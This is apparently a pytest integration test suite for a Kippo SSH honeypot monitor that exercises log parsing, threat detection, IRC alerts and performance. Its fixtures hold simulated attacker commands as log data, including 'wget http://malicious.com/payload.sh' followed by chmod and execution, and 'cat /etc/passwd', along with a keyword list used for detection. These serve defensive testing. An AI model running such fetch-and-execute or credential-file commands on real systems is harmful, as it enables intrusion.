#!/usr/bin/env python3
"""
Comprehensive integration test suite for honeypot monitor.
Tests end-to-end workflows, IRC integration, and performance benchmarks.
"""

import pytest
import asyncio
import tempfile
import os
import time
import threading
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path
import json
import csv

from honeypot_monitor.services.log_monitor import LogMonitor
from honeypot_monitor.services.log_parser import KippoLogParser
from honeypot_monitor.services.threat_analyzer import ThreatAnalyzer
from honeypot_monitor.services.irc_notifier import IRCNotifier
from honeypot_monitor.services.event_manager import EventManager, EventType
from honeypot_monitor.services.service_coordinator import ServiceCoordinator
from honeypot_monitor.config.config_manager import ConfigManager
from honeypot_monitor.models.log_entry import LogEntry
from honeypot_monitor.models.threat_assessment import ThreatAssessment
from honeypot_monitor.models.session import Session


class TestEndToEndWorkflows:
    """Test complete user workflows from log ingestion to analysis."""
    
    @pytest.fixture
    def temp_log_file(self):
        """Create a temporary log file for testing."""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            yield f.name
        os.unlink(f.name)
    
    @pytest.fixture
    def mock_kippo_logs(self):
        """Generate realistic Kippo log entries for testing."""
        return [
            "2024-01-15 10:30:15+0000 [SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] connection lost",
            "2024-01-15 10:30:20+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] login attempt [root/password] succeeded",
            "2024-01-15 10:30:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: ls -la",
            "2024-01-15 10:30:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: cat /etc/passwd",
            "2024-01-15 10:30:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: wget http://malicious.com/payload.sh",
            "2024-01-15 10:30:40+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: chmod +x payload.sh",
            "2024-01-15 10:30:45+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: ./payload.sh",
            "2024-01-15 10:31:00+0000 [SSHService ssh-connection on HoneyPotTransport,3,192.168.1.102] login attempt [admin/admin] failed",
            "2024-01-15 10:31:05+0000 [SSHService ssh-connection on HoneyPotTransport,3,192.168.1.102] login attempt [admin/123456] succeeded",
            "2024-01-15 10:31:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,3,192.168.1.102] CMD: uname -a",
        ]
    
    def test_complete_log_processing_workflow(self, temp_log_file, mock_kippo_logs):
        """Test complete workflow from log file monitoring to threat analysis."""
        # Setup components
        event_manager = EventManager()
        parser = KippoLogParser()
        analyzer = ThreatAnalyzer()
        monitor = LogMonitor(event_manager, parser)
        
        # Track processed entries and threats
        processed_entries = []
        detected_threats = []
        
        def log_handler(event):
            processed_entries.append(event.data)
        
        def threat_handler(event):
            detected_threats.append(event.data)
        
        event_manager.subscribe(EventType.LOG_ENTRY, log_handler)
        event_manager.subscribe(EventType.THREAT_DETECTED, threat_handler)
        
        try:
            # Write initial log entries
            with open(temp_log_file, 'w') as f:
                for log_line in mock_kippo_logs[:5]:
                    f.write(log_line + '\n')
            
            # Start monitoring
            monitor.start_monitoring(temp_log_file)
            time.sleep(0.1)  # Allow initial processing
            
            # Add more log entries to simulate real-time activity
            with open(temp_log_file, 'a') as f:
                for log_line in mock_kippo_logs[5:]:
                    f.write(log_line + '\n')
                    time.sleep(0.05)  # Simulate real-time writing
            
            # Wait for processing
            time.sleep(0.5)
            
            # Verify log entries were processed
            assert len(processed_entries) > 0, "No log entries were processed"
            
            # Verify threat analysis occurred
            # Should detect threats from malicious commands
            malicious_commands = ['wget', 'chmod +x', './payload.sh']
            for entry in processed_entries:
                if hasattr(entry, 'command') and entry.command:
                    if any(cmd in entry.command for cmd in malicious_commands):
                        threat = analyzer.analyze_entry(entry)
                        assert threat is not None, f"No threat detected for malicious command: {entry.command}"
            
        finally:
            monitor.stop_monitoring()
            event_manager.shutdown()
    
    def test_session_correlation_workflow(self, mock_kippo_logs):
        """Test session correlation and tracking across multiple log entries."""
        parser = KippoLogParser()
        analyzer = ThreatAnalyzer()
        
        # Parse all log entries
        entries = []
        for log_line in mock_kippo_logs:
            try:
                entry = parser.parse_entry(log_line)
                if entry:
                    entries.append(entry)
            except Exception:
                continue
        
        # Group entries by session
        sessions = {}
        for entry in entries:
            if entry.session_id not in sessions:
                sessions[entry.session_id] = []
            sessions[entry.session_id].append(entry)
        
        # Verify session correlation
        assert len(sessions) > 1, "Should have multiple sessions"
        
        # Verify session analysis
        for session_id, session_entries in sessions.items():
            if len(session_entries) > 1:
                # Should be able to track command progression
                commands = [e.command for e in session_entries if e.command]
                if commands:
                    assert len(commands) > 0, f"Session {session_id} should have commands"
    
    def test_export_functionality_workflow(self, mock_kippo_logs):
        """Test data export functionality to CSV and JSON."""
        parser = KippoLogParser()
        
        # Parse log entries
        entries = []
        for log_line in mock_kippo_logs:
            try:
                entry = parser.parse_entry(log_line)
                if entry:
                    entries.append(entry)
            except Exception:
                continue
        
        # Test CSV export
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.csv') as csv_file:
            writer = csv.writer(csv_file)
            writer.writerow(['timestamp', 'session_id', 'event_type', 'source_ip', 'message', 'command'])
            
            for entry in entries:
                writer.writerow([
                    entry.timestamp.isoformat(),
                    entry.session_id,
                    entry.event_type,
                    entry.source_ip,
                    entry.message,
                    entry.command or ''
                ])
        
        # Verify CSV file was created and has content
        assert os.path.exists(csv_file.name), "CSV file was not created"
        with open(csv_file.name, 'r') as f:
            csv_content = f.read()
            assert len(csv_content) > 0, "CSV file is empty"
            assert 'timestamp' in csv_content, "CSV header missing"
        
        os.unlink(csv_file.name)
        
        # Test JSON export
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as json_file:
            export_data = []
            for entry in entries:
                export_data.append({
                    'timestamp': entry.timestamp.isoformat(),
                    'session_id': entry.session_id,
                    'event_type': entry.event_type,
                    'source_ip': entry.source_ip,
                    'message': entry.message,
                    'command': entry.command
                })
            
            json.dump(export_data, json_file, indent=2)
        
        # Verify JSON file was created and has content
        assert os.path.exists(json_file.name), "JSON file was not created"
        with open(json_file.name, 'r') as f:
            json_data = json.load(f)
            assert len(json_data) > 0, "JSON file has no data"
            assert 'timestamp' in json_data[0], "JSON structure incorrect"
        
        os.unlink(json_file.name)


class TestMockIRCIntegration:
    """Test IRC integration with mock IRC server."""
    
    @pytest.fixture
    def mock_irc_server(self):
        """Create a mock IRC server for testing."""
        class MockIRCServer:
            def __init__(self):
                self.connected = False
                self.messages = []
                self.channels = set()
                self.nickname = None
            
            def connect(self, server, port, nickname):
                self.connected = True
                self.nickname = nickname
                return True
            
            def join(self, channel):
                self.channels.add(channel)
                return True
            
            def privmsg(self, target, message):
                self.messages.append((target, message))
                return True
            
            def disconnect(self):
                self.connected = False
                self.channels.clear()
                return True
        
        return MockIRCServer()
    
    def test_irc_connection_and_alerts(self, mock_irc_server):
        """Test IRC connection and alert sending."""
        with patch('honeypot_monitor.services.irc_notifier.irc') as mock_irc:
            mock_irc.client.SimpleIRCClient.return_value = mock_irc_server
            
            notifier = IRCNotifier()
            
            # Test connection
            success = notifier.connect("irc.test.com", "#test-channel", "test-bot")
            assert success, "IRC connection should succeed"
            assert mock_irc_server.connected, "Mock server should be connected"
            assert "#test-channel" in mock_irc_server.channels, "Should join channel"
            
            # Test new host alert
            notifier.send_new_host_alert("192.168.1.100", datetime.now())
            assert len(mock_irc_server.messages) > 0, "Should send new host alert"
            
            # Test threat alert
            threat = ThreatAssessment(
                severity="high",
                category="exploitation",
                confidence=0.9,
                indicators=["malicious command"],
                recommended_action="investigate"
            )
            notifier.send_threat_alert(threat, "192.168.1.101")
            assert len(mock_irc_server.messages) > 1, "Should send threat alert"
            
            # Test interesting traffic alert
            notifier.send_interesting_traffic_alert("Multiple login attempts", "5 failed attempts from 192.168.1.102")
            assert len(mock_irc_server.messages) > 2, "Should send interesting traffic alert"
            
            # Verify message content
            messages = [msg[1] for msg in mock_irc_server.messages]
            assert any("192.168.1.100" in msg for msg in messages), "New host IP should be in messages"
            assert any("high" in msg.lower() for msg in messages), "Threat severity should be in messages"
            assert any("login attempts" in msg.lower() for msg in messages), "Traffic description should be in messages"
            
            # Test disconnection
            notifier.disconnect()
            assert not mock_irc_server.connected, "Should disconnect from server"
    
    def test_irc_rate_limiting(self, mock_irc_server):
        """Test IRC rate limiting to prevent flooding."""
        with patch('honeypot_monitor.services.irc_notifier.irc') as mock_irc:
            mock_irc.client.SimpleIRCClient.return_value = mock_irc_server
            
            notifier = IRCNotifier()
            notifier.connect("irc.test.com", "#test-channel", "test-bot")
            
            # Send multiple alerts rapidly
            initial_count = len(mock_irc_server.messages)
            for i in range(10):
                notifier.send_new_host_alert(f"192.168.1.{i}", datetime.now())
            
            # Should have rate limiting in place
            final_count = len(mock_irc_server.messages)
            messages_sent = final_count - initial_count
            
            # Exact rate limiting behavior depends on implementation
            # but should not send all 10 messages immediately
            assert messages_sent <= 10, "Rate limiting should be in effect"
    
    def test_irc_reconnection_handling(self, mock_irc_server):
        """Test IRC automatic reconnection on connection loss."""
        with patch('honeypot_monitor.services.irc_notifier.irc') as mock_irc:
            mock_irc.client.SimpleIRCClient.return_value = mock_irc_server
            
            notifier = IRCNotifier()
            notifier.connect("irc.test.com", "#test-channel", "test-bot")
            
            # Simulate connection loss
            mock_irc_server.connected = False
            
            # Try to send alert (should trigger reconnection attempt)
            notifier.send_new_host_alert("192.168.1.100", datetime.now())
            
            # Implementation should handle reconnection gracefully
            # (exact behavior depends on implementation details)


class TestPerformanceBenchmarks:
    """Performance benchmarks for large log file processing."""
    
    def generate_large_log_file(self, num_entries=10000):
        """Generate a large log file for performance testing."""
        log_templates = [
            "2024-01-15 {time}+0000 [SSHService ssh-connection on HoneyPotTransport,{session},{ip}] login attempt [root/password] succeeded",
            "2024-01-15 {time}+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,{session},{ip}] CMD: {command}",
            "2024-01-15 {time}+0000 [SSHService ssh-connection on HoneyPotTransport,{session},{ip}] connection lost",
        ]
        
        commands = ["ls -la", "cat /etc/passwd", "wget http://test.com/file", "uname -a", "ps aux"]
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as f:
            base_time = datetime(2024, 1, 15, 10, 0, 0)
            
            for i in range(num_entries):
                template = log_templates[i % len(log_templates)]
                current_time = base_time + timedelta(seconds=i)
                session_id = (i // 10) + 1
                ip = f"192.168.1.{(i % 254) + 1}"
                command = commands[i % len(commands)]
                
                log_line = template.format(
                    time=current_time.strftime("%H:%M:%S"),
                    session=session_id,
                    ip=ip,
                    command=command
                )
                f.write(log_line + '\n')
            
            return f.name
    
    def test_large_file_parsing_performance(self):
        """Benchmark parsing performance with large log files."""
        log_file = self.generate_large_log_file(10000)
        
        try:
            parser = KippoLogParser()
            
            start_time = time.time()
            parsed_count = 0
            
            with open(log_file, 'r') as f:
                for line in f:
                    try:
                        entry = parser.parse_entry(line.strip())
                        if entry:
                            parsed_count += 1
                    except Exception:
                        continue
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Performance assertions
            assert parsed_count > 0, "Should parse some entries"
            assert processing_time < 30.0, f"Parsing took too long: {processing_time:.2f}s"
            
            entries_per_second = parsed_count / processing_time
            assert entries_per_second > 100, f"Too slow: {entries_per_second:.2f} entries/sec"
            
            print(f"Performance: Parsed {parsed_count} entries in {processing_time:.2f}s ({entries_per_second:.2f} entries/sec)")
            
        finally:
            os.unlink(log_file)
    
    def test_memory_usage_with_large_datasets(self):
        """Test memory usage with large datasets."""
        import psutil
        import gc
        
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Create large dataset
        entries = []
        for i in range(50000):
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id=f"session_{i % 1000}",
                event_type="command",
                source_ip=f"192.168.1.{(i % 254) + 1}",
                message=f"test message {i}",
                command=f"test command {i}"
            )
            entries.append(entry)
        
        peak_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = peak_memory - initial_memory
        
        # Clean up
        del entries
        gc.collect()
        
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        print(f"Memory usage: Initial: {initial_memory:.2f}MB, Peak: {peak_memory:.2f}MB, Final: {final_memory:.2f}MB")
        print(f"Memory increase: {memory_increase:.2f}MB")
        
        # Memory usage should be reasonable
        assert memory_increase < 500, f"Memory usage too high: {memory_increase:.2f}MB"
    
    def test_concurrent_processing_performance(self):
        """Test performance with concurrent log processing."""
        log_file = self.generate_large_log_file(5000)
        
        try:
            event_manager = EventManager(worker_threads=4)
            parser = KippoLogParser()
            
            processed_count = 0
            processing_lock = threading.Lock()
            
            def log_handler(event):
                nonlocal processed_count
                with processing_lock:
                    processed_count += 1
            
            event_manager.subscribe(EventType.LOG_ENTRY, log_handler)
            
            start_time = time.time()
            
            # Process log file
            with open(log_file, 'r') as f:
                for line in f:
                    try:
                        entry = parser.parse_entry(line.strip())
                        if entry:
                            event_manager.publish_log_entry(entry)
                    except Exception:
                        continue
            
            # Wait for processing to complete
            time.sleep(2.0)
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            event_manager.shutdown()
            
            # Performance assertions
            assert processed_count > 0, "Should process some entries"
            assert processing_time < 20.0, f"Concurrent processing took too long: {processing_time:.2f}s"
            
            entries_per_second = processed_count / processing_time
            print(f"Concurrent performance: Processed {processed_count} entries in {processing_time:.2f}s ({entries_per_second:.2f} entries/sec)")
            
        finally:
            os.unlink(log_file)


class TestServiceIntegration:
    """Test integration between all services."""
    
    def test_service_coordinator_integration(self):
        """Test ServiceCoordinator managing all services."""
        # Create mock configuration
        config_data = {
            'honeypot': {
                'log_path': '/tmp/test.log',
                'log_format': 'kippo_default'
            },
            'monitoring': {
                'refresh_interval': 1.0,
                'max_entries_memory': 1000
            },
            'analysis': {
                'threat_threshold': 'medium',
                'custom_rules_path': './rules/'
            },
            'irc': {
                'enabled': False,
                'server': 'irc.test.com',
                'port': 6667,
                'channel': '#test',
                'nickname': 'test-bot',
                'ssl': False
            }
        }
        
        with patch('honeypot_monitor.config.config_manager.ConfigManager.load_config') as mock_load:
            mock_load.return_value = config_data
            
            coordinator = ServiceCoordinator()
            
            # Test service initialization
            coordinator.initialize_services()
            
            # Verify services are created
            assert coordinator.event_manager is not None, "EventManager should be initialized"
            assert coordinator.log_parser is not None, "LogParser should be initialized"
            assert coordinator.threat_analyzer is not None, "ThreatAnalyzer should be initialized"
            
            # Test service coordination
            # This would involve more complex integration testing
            # depending on the actual ServiceCoordinator implementation
            
            coordinator.shutdown()


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v"])